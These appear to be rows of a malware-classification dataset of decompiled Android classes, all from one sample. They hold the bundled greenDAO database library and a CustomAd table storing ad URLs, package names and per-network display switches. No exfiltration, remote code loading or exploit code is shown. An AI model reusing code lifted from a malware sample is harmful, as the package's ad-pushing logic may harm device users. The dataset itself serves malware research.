executeInsert;     if (this.db.isDbLockedByCurrentThread()) { synchronized (sQLiteStatement) {         bindValues(sQLiteStatement,t);         executeInsert=sQLiteStatement.executeInsert();       }     }  else {       this.db.beginTransaction();       try { synchronized (sQLiteStatement) {           bindValues(sQLiteStatement,t);           executeInsert=sQLiteStatement.executeInsert();         }         this.db.setTransactionSuccessful();       }   finally {         this.db.endTransaction();       }     }     updateKeyAfterInsertAndAttach(t,executeInsert,true);     return executeInsert;   }   private void executeInsertInTx(  SQLiteStatement sQLiteStatement,  Iterable<T> iterable,  boolean z){     this.db.beginTransaction();     try { synchronized (sQLiteStatement) {         if (this.identityScope != null) {           this.identityScope.lock();         }         try {           for (          T t : iterable) {             bindValues(sQLiteStatement,t);             if (z) {               updateKeyAfterInsertAndAttach(t,sQLiteStatement.executeInsert(),false);             }  else {               sQLiteStatement.execute();             }           }         }   finally {           if (this.identityScope != null) {             this.identityScope.unlock();           }         }       }       this.db.setTransactionSuccessful();     }   finally {       this.db.endTransaction();     }   }   protected void assertSinglePk(){     if (this.config.pkColumns.length != 1) {       throw new DaoException(this + "" ("" + this.config.tablename+ "") does not have a single-column primary key"");     }   }   protected void attachEntity(  T t){   }   protected final void attachEntity(  K k,  T t,  boolean z){     attachEntity(t);     if (this.identityScope == null || k == null) {       return;     }     if (z) {       this.identityScope.put(k,t);     }  else {       this.identityScope.putNoLock(k,t);     }   }   protected abstract void bindValues(  SQLiteStatement sQLiteStatement,  T t);   public long count(){     return DatabaseUtils.queryNumEntries(this.db,'\'' + this.config.tablename + '\'');   }   public void delete(  T t){     assertSinglePk();     deleteByKey(getKeyVerified(t));   }   public void deleteAll(){     this.db.execSQL(""DELETE FROM '"" + this.config.tablename + ""'"");     if (this.identityScope != null) {       this.identityScope.clear();     }   }   public void deleteByKey(  K k){     assertSinglePk();     SQLiteStatement deleteStatement=this.statements.getDeleteStatement();     if (this.db.isDbLockedByCurrentThread()) { synchronized (deleteStatement) {         deleteByKeyInsideSynchronized(k,deleteStatement);       }     }  else {       this.db.beginTransaction();       try { synchronized (deleteStatement) {           deleteByKeyInsideSynchronized(k,deleteStatement);         }         this.db.setTransactionSuccessful();       }   finally {         this.db.endTransaction();       }     }     if (this.identityScope != null) {       this.identityScope.remove((IdentityScope<K,T>)k);     }   }   public void deleteByKeyInTx(  Iterable<K> iterable){     deleteInTxInternal(null,iterable);   }   public void deleteByKeyInTx(  K... kArr){     deleteInTxInternal(null,Arrays.asList(kArr));   }   public void deleteInTx(  Iterable<T> iterable){     deleteInTxInternal(iterable,null);   }   public void deleteInTx(  T... tArr){     deleteInTxInternal(Arrays.asList(tArr),null);   }   public boolean detach(  T t){     if (this.identityScope == null) {       return false;     }     return this.identityScope.detach(getKeyVerified(t),t);   }   public String[] getAllColumns(){     return this.config.allColumns;   }   public SQLiteDatabase getDatabase(){     return this.db;   }   public abstract K getKey(  T t);   protected K getKeyVerified(  T t){     K key=getKey(t);     if (key != null) {       return key;     }     if (t == null) {       throw new NullPointerException(""Entity may not be null"");     }     throw new DaoException(""Entity has no key"");   }   public String[] getNonPkColumns(){     return this.config.nonPkColumns;   }   public String[] getPkColumns(){     return this.config.pkColumns;   }   public Property getPkProperty(){     return this.config.pkProperty;   }   public Property[] getProperties(){     return this.config.properties;   }   public AbstractDaoSession getSession(){     return this.session;   }   public TableStatements getStatements(){     return this.config.statements;   }   public String getTablename(){     return this.config.tablename;   }   public long insert(  T t){     return executeInsert(t,this.statements.getInsertStatement());   }   public void insertInTx(  Iterable<T> iterable){     insertInTx(iterable,isEntityUpdateable());   }   public void insertInTx(  Iterable<T> iterable,  boolean z){     executeInsertInTx(this.statements.getInsertStatement(),iterable,z);   }   public void insertInTx(  T... tArr){     insertInTx(Arrays.asList(tArr),isEntityUpdateable());   }   public long insertOrReplace(  T t){     return executeInsert(t,this.statements.getInsertOrReplaceStatement());   }   public void insertOrReplaceInTx(  Iterable<T> iterable){     insertOrReplaceInTx(iterable,isEntityUpdateable());   }   public void insertOrReplaceInTx(  Iterable<T> iterable,  boolean z){     executeInsertInTx(this.statements.getInsertOrReplaceStatement(),iterable,z);   }   public void insertOrReplaceInTx(  T... tArr){     insertOrReplaceInTx(Arrays.asList(tArr),isEntityUpdateable());   }   public long insertWithoutSettingPk(  T t){     long executeInsert;     SQLiteStatement insertStatement=this.statements.getInsertStatement();     if (this.db.isDbLockedByCurrentThread()) { synchronized (insertStatement) {         bindValues(insertStatement,t);         executeInsert=insertStatement.executeInsert();       }     }  else {       this.db.beginTransaction();       try { synchronized (insertStatement) {           bindValues(insertStatement,t);           executeInsert=insertStatement.executeInsert();         }         this.db.setTransactionSuccessful();       }   finally {         this.db.endTransaction();       }     }     return executeInsert;   }   public abstract boolean isEntityUpdateable();   public T load(  K k){     T t;     assertSinglePk();     if (k == null) {       return null;     }     return (this.identityScope == null || (t=this.identityScope.get(k)) == null) ? loadUniqueAndCloseCursor(this.db.rawQuery(this.statements.getSelectByKey(),new String[]{k.toString()})) : t;   }   public List<T> loadAll(){     return loadAllAndCloseCursor(this.db.rawQuery(this.statements.getSelectAll(),null));   }   public List<T> loadAllAndCloseCursor(  Cursor cursor){     try {       return loadAllFromCursor(cursor);     }   finally {       cursor.close();     }   }   protected List<T> loadAllFromCursor(  Cursor cursor){     CursorWindow window;     int count=cursor.getCount();     ArrayList arrayList=new ArrayList(count);     if ((cursor instanceof CrossProcessCursor) && (window=((CrossProcessCursor)cursor).getWindow()) != null) {       if (window.getNumRows() == count) {         cursor=new FastCursor(window);       }  else {         DaoLog.d(""Window vs. result size: "" + window.getNumRows() + ""/""+ count);       }     }     if (cursor.moveToFirst()) {       if (this.identityScope != null) {         this.identityScope.lock();         this.identityScope.reserveRoom(count);       }       do {         try {           arrayList.add(loadCurrent(cursor,0,false));         }   finally {           if (this.identityScope != null) {             this.identityScope.unlock();           }         }       }  while (cursor.moveToNext());     }     return arrayList;   }   public T loadByRowId(  long j){     return loadUniqueAndCloseCursor(this.db.rawQuery(this.statements.getSelectByRowId(),new String[]{Long.toString(j)}));   }   public final T loadCurrent(  Cursor cursor,  int i,  boolean z){     if (this.identityScopeLong != null) {       if (i != 0 && cursor.isNull(this.pkOrdinal + i)) {         return null;       }       long j=cursor.getLong(this.pkOrdinal + i);       T t=z ? this.identityScopeLong.get2(j) : this.identityScopeLong.get2NoLock(j);       if (t != null) {         return t;       }       T readEntity=readEntity(cursor,i);       attachEntity(readEntity);       if (z) {         this.identityScopeLong.put2(j,readEntity);         return readEntity;       }       this.identityScopeLong.put2NoLock(j,readEntity);       return readEntity;     }     if (this.identityScope == null) {       if (i != 0 && readKey(cursor,i) == null) {         return null;       }       T readEntity2=readEntity(cursor,i);       attachEntity(readEntity2);       return readEntity2;     }     K readKey=readKey(cursor,i);     if (i != 0 && readKey == null) {       return null;     }     T noLock=z ? this.identityScope.get(readKey) : this.identityScope.getNoLock(readKey);     if (noLock != null) {       return noLock;     }     T readEntity3=readEntity(cursor,i);     attachEntity(readKey,readEntity3,z);     return readEntity3;   }   protected final <O>O loadCurrentOther(  AbstractDao<O,?> abstractDao,  Cursor cursor,  int i){     return abstractDao.loadCurrent(cursor,i,true);   }   protected T loadUnique(  Cursor cursor){     if (!cursor.moveToFirst()) {       return null;     }     if (cursor.isLast()) {       return loadCurrent(cursor,0,true);     }     throw new DaoException(""Expected unique result, but count was "" + cursor.getCount());   }   public T loadUniqueAndCloseCursor(  Cursor cursor){     try {       return loadUnique(cursor);     }   finally {       cursor.close();     }   }   public QueryBuilder<T> queryBuilder(){     return QueryBuilder.internalCreate(this);   }   public List<T> queryRaw(  String str,  String... strArr){     return loadAllAndCloseCursor(this.db.rawQuery(this.statements.getSelectAll() + str,strArr));   }   public Query<T> queryRawCreate(  String str,  Object... objArr){     return queryRawCreateListArgs(str,Arrays.asList(objArr));   }   public Query<T> queryRawCreateListArgs(  String str,  Collection<Object> collection){     return Query.internalCreate(this,this.statements.getSelectAll() + str,collection.toArray());   }   public abstract T readEntity(  Cursor cursor,  int i);   protected abstract void readEntity(  Cursor cursor,  T t,  int i);   public abstract K readKey(  Cursor cursor,  int i);   public void refresh(  T t){     assertSinglePk();     K keyVerified=getKeyVerified(t);     Cursor rawQuery=this.db.rawQuery(this.statements.getSelectByKey(),new String[]{keyVerified.toString()});     try {       if (!rawQuery.moveToFirst()) {         throw new DaoException(""Entity does not exist in the database anymore: "" + t.getClass() + "" with key ""+ keyVerified);       }       if (!rawQuery.isLast()) {         throw new DaoException(""Expected unique result, but count was "" + rawQuery.getCount());       }       readEntity(rawQuery,t,0);       attachEntity(keyVerified,t,true);     }   finally {       rawQuery.close();     }   }   public void update(  T t){     assertSinglePk();     SQLiteStatement updateStatement=this.statements.getUpdateStatement();     if (this.db.isDbLockedByCurrentThread()) { synchronized (updateStatement) {         updateInsideSynchronized(t,updateStatement,true);       }       return;     }     this.db.beginTransaction();     try { synchronized (updateStatement) {         updateInsideSynchronized(t,updateStatement,true);       }       this.db.setTransactionSuccessful();     }   finally {       this.db.endTransaction();     }   }   public void updateInTx(  Iterable<T> iterable){     SQLiteStatement updateStatement=this.statements.getUpdateStatement();     this.db.beginTransaction();     try { synchronized (updateStatement) {         if (this.identityScope != null) {           this.identityScope.lock();         }         try {           Iterator<T> it=iterable.iterator();           while (it.hasNext()) {             updateInsideSynchronized(it.next(),updateStatement,false);           }         }   finally {           if (this.identityScope != null) {             this.identityScope.unlock();           }         }       }       this.db.setTransactionSuccessful();     }   finally {       this.db.endTransaction();     }   }   public void updateInTx(  T... tArr){     updateInTx(Arrays.asList(tArr));   }   protected void updateInsideSynchronized(  T t,  SQLiteStatement sQLiteStatement,  boolean z){     bindValues(sQLiteStatement,t);     int length=this.config.allColumns.length + 1;     Object key=getKey(t);     if (key instanceof Long) {       sQLiteStatement.bindLong(length,((Long)key).longValue());     }  else {       if (key == null) {         throw new DaoException(""Cannot update entity without key - was it inserted before?"");       }       sQLiteStatement.bindString(length,key.toString());     }     sQLiteStatement.execute();     attachEntity(key,t,z);   }   protected abstract K updateKeyAfterInsert(  T t,  long j);   protected void updateKeyAfterInsertAndAttach(  T t,  long j,  boolean z){     if (j != -1) {       attachEntity(updateKeyAfterInsert(t,j),t,z);     }  else {       DaoLog.w(""Could not insert row (executeInsert returned -1)"");     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\AbstractDaoMaster.code","public abstract class AbstractDaoMaster {   protected final Map<Class<? extends AbstractDao<?,?>>,DaoConfig> daoConfigMap=new HashMap();   protected final SQLiteDatabase db;   protected final int schemaVersion;   public AbstractDaoMaster(  SQLiteDatabase sQLiteDatabase,  int i){     this.db=sQLiteDatabase;     this.schemaVersion=i;   }   public SQLiteDatabase getDatabase(){     return this.db;   }   public int getSchemaVersion(){     return this.schemaVersion;   }   public abstract AbstractDaoSession newSession();   public abstract AbstractDaoSession newSession(  IdentityScopeType identityScopeType);   public void registerDaoClass(  Class<? extends AbstractDao<?,?>> cls){     this.daoConfigMap.put(cls,new DaoConfig(this.db,cls));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\AbstractDaoSession.code","public class AbstractDaoSession {   private final SQLiteDatabase db;   private final Map<Class<?>,AbstractDao<?,?>> entityToDao=new HashMap();   public AbstractDaoSession(  SQLiteDatabase sQLiteDatabase){     this.db=sQLiteDatabase;   }   public <V>V callInTx(  Callable<V> callable){     this.db.beginTransaction();     try {       V call=callable.call();       this.db.setTransactionSuccessful();       return call;     }   finally {       this.db.endTransaction();     }   }   public <V>V callInTxNoException(  Callable<V> callable){     this.db.beginTransaction();     try {       try {         V call=callable.call();         this.db.setTransactionSuccessful();         return call;       }  catch (      Exception e) {         throw new DaoException(""Callable failed"",e);       }     }   finally {       this.db.endTransaction();     }   }   public <T>void delete(  T t){     getDao(t.getClass()).delete(t);   }   public <T>void deleteAll(  Class<T> cls){     getDao(cls).deleteAll();   }   public AbstractDao<?,?> getDao(  Class<? extends Object> cls){     AbstractDao<?,?> abstractDao=this.entityToDao.get(cls);     if (abstractDao == null) {       throw new DaoException(""No DAO registered for "" + cls);     }     return abstractDao;   }   public SQLiteDatabase getDatabase(){     return this.db;   }   public <T>long insert(  T t){     return getDao(t.getClass()).insert(t);   }   public <T>long insertOrReplace(  T t){     return getDao(t.getClass()).insertOrReplace(t);   }   public <T,K>T load(  Class<T> cls,  K k){     return (T)getDao(cls).load(k);   }   public <T,K>List<T> loadAll(  Class<T> cls){     return (List<T>)getDao(cls).loadAll();   }   public <T>QueryBuilder<T> queryBuilder(  Class<T> cls){     return (QueryBuilder<T>)getDao(cls).queryBuilder();   }   public <T,K>List<T> queryRaw(  Class<T> cls,  String str,  String... strArr){     return (List<T>)getDao(cls).queryRaw(str,strArr);   }   public <T>void refresh(  T t){     getDao(t.getClass()).refresh(t);   }   public <T>void registerDao(  Class<T> cls,  AbstractDao<T,?> abstractDao){     this.entityToDao.put(cls,abstractDao);   }   public void runInTx(  Runnable runnable){     this.db.beginTransaction();     try {       runnable.run();       this.db.setTransactionSuccessful();     }   finally {       this.db.endTransaction();     }   }   public AsyncSession startAsyncSession(){     return new AsyncSession(this);   }   public <T>void update(  T t){     getDao(t.getClass()).update(t);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\CustomAd.code","public class CustomAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private String diyImg;   private Long expires;   private String g2Switches;   private String g3Switches;   private String icon;   private Long id;   private String intro;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private String url;   private String wifiSwitches;   public CustomAd(){   }   public CustomAd(  Long l){     this.id=l;   }   public CustomAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  String str14){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.diyImg=str14;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public String getDiyImg(){     return this.diyImg;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setDiyImg(  String str){     this.diyImg=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\CustomAdDao.code","public class CustomAdDao extends AbstractDao<CustomAd,Long> {   public static final String TABLENAME=""CUSTOM_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property DiyImg=new Property(17,String.class,""diyImg"",false,""DIY_IMG"");   }   public CustomAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public CustomAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'CUSTOM_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'DIY_IMG' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'CUSTOM_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  CustomAd customAd){     sQLiteStatement.clearBindings();     Long id=customAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=customAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (customAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (customAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=customAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=customAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=customAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=customAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=customAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=customAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=customAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=customAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=customAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=customAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=customAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=customAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=customAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     String diyImg=customAd.getDiyImg();     if (diyImg != null) {       sQLiteStatement.bindString(18,diyImg);     }   }   @Override public Long getKey(  CustomAd customAd){     if (customAd != null) {       return customAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public CustomAd readEntity(  Cursor cursor,  int i){     return new CustomAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : cursor.getString(i + 17));   }   @Override public void readEntity(  Cursor cursor,  CustomAd customAd,  int i){     customAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     customAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     customAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     customAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     customAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     customAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     customAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     customAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     customAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     customAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     customAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     customAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     customAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     customAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     customAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     customAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     customAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     customAd.setDiyImg(cursor.isNull(i + 17) ? null : cursor.getString(i + 17));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  CustomAd customAd,  long j){     customAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\DaoException.code","public class DaoException extends SQLException {   private static final long serialVersionUID=-5877937327907457779L;   public DaoException(){   }   public DaoException(  String str){     super(str);   }   public DaoException(  String str,  Throwable th){     super(str);     safeInitCause(th);   }   public DaoException(  Throwable th){     safeInitCause(th);   }   protected void safeInitCause(  Throwable th){     try {       initCause(th);     }  catch (    Throwable th2) {       DaoLog.e(""Could not set initial cause"",th2);       DaoLog.e(""Initial cause is:"",th);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\DaoLog.code","public class DaoLog {   public static final int ASSERT=7;   public static final int DEBUG=3;   public static final int ERROR=6;   public static final int INFO=4;   private static final String TAG=""greenDAO"";   public static final int VERBOSE=2;   public static final int WARN=5;   public static int d(  String str){     return Log.d(TAG,str);   }   public static int d(  String str,  Throwable th){     return Log.d(TAG,str,th);   }   public static int e(  String str){     return Log.w(TAG,str);   }   public static int e(  String str,  Throwable th){     return Log.e(TAG,str,th);   }   public static String getStackTraceString(  Throwable th){     return Log.getStackTraceString(th);   }   public static int i(  String str){     return Log.i(TAG,str);   }   public static int i(  String str,  Throwable th){     return Log.i(TAG,str,th);   }   public static boolean isLoggable(  int i){     return Log.isLoggable(TAG,i);   }   public static int println(  int i,  String str){     return Log.println(i,TAG,str);   }   public static int v(  String str){     return Log.v(TAG,str);   }   public static int v(  String str,  Throwable th){     return Log.v(TAG,str,th);   }   public static int w(  String str){     return Log.w(TAG,str);   }   public static int w(  String str,  Throwable th){     return Log.w(TAG,str,th);   }   public static int w(  Throwable th){     return Log.w(TAG,th);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\DbUtils.code","public class DbUtils {   public static int copyAllBytes(  InputStream inputStream,  OutputStream outputStream){     byte[] bArr=new byte[4096];     int i=0;     while (true) {       int read=inputStream.read(bArr);       if (read == -1) {         return i;       }       outputStream.write(bArr,0,read);       i+=read;     }   }   public static int executeSqlScript(  Context context,  SQLiteDatabase sQLiteDatabase,  String str){     return executeSqlScript(context,sQLiteDatabase,str,true);   }   public static int executeSqlScript(  Context context,  SQLiteDatabase sQLiteDatabase,  String str,  boolean z){     String[] split=new String(readAsset(context,str),AsyncHttpResponseHandler.DEFAULT_CHARSET).split("";(\\s)*[\n\r]"");     int executeSqlStatementsInTx=z ? executeSqlStatementsInTx(sQLiteDatabase,split) : executeSqlStatements(sQLiteDatabase,split);     DaoLog.i(""Executed "" + executeSqlStatementsInTx + "" statements from SQL script '""+ str+ ""'"");     return executeSqlStatementsInTx;   }   public static int executeSqlStatements(  SQLiteDatabase sQLiteDatabase,  String[] strArr){     int i=0;     for (    String str : strArr) {       String trim=str.trim();       if (trim.length() > 0) {         sQLiteDatabase.execSQL(trim);         i++;       }     }     return i;   }   public static int executeSqlStatementsInTx(  SQLiteDatabase sQLiteDatabase,  String[] strArr){     sQLiteDatabase.beginTransaction();     try {       int executeSqlStatements=executeSqlStatements(sQLiteDatabase,strArr);       sQLiteDatabase.setTransactionSuccessful();       return executeSqlStatements;     }   finally {       sQLiteDatabase.endTransaction();     }   }   public static void logTableDump(  SQLiteDatabase sQLiteDatabase,  String str){     Cursor query=sQLiteDatabase.query(str,null,null,null,null,null,null);     try {       DaoLog.d(DatabaseUtils.dumpCursorToString(query));     }   finally {       query.close();     }   }   public static byte[] readAllBytes(  InputStream inputStream){     ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();     copyAllBytes(inputStream,byteArrayOutputStream);     return byteArrayOutputStream.toByteArray();   }   public static byte[] readAsset(  Context context,  String str){     InputStream open=context.getResources().getAssets().open(str);     try {       return readAllBytes(open);     }   finally {       open.close();     }   }   public static void vacuum(  SQLiteDatabase sQLiteDatabase){     sQLiteDatabase.execSQL(""VACUUM"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\InternalQueryDaoAccess.code","public final class InternalQueryDaoAccess<T> {   private final AbstractDao<T,?> dao;   public InternalQueryDaoAccess(  AbstractDao<T,?> abstractDao){     this.dao=abstractDao;   }   public static <T2>TableStatements getStatements(  AbstractDao<T2,?> abstractDao){     return abstractDao.getStatements();   }   public TableStatements getStatements(){     return this.dao.getStatements();   }   public List<T> loadAllAndCloseCursor(  Cursor cursor){     return this.dao.loadAllAndCloseCursor(cursor);   }   public T loadCurrent(  Cursor cursor,  int i,  boolean z){     return this.dao.loadCurrent(cursor,i,z);   }   public T loadUniqueAndCloseCursor(  Cursor cursor){     return this.dao.loadUniqueAndCloseCursor(cursor);   } } "
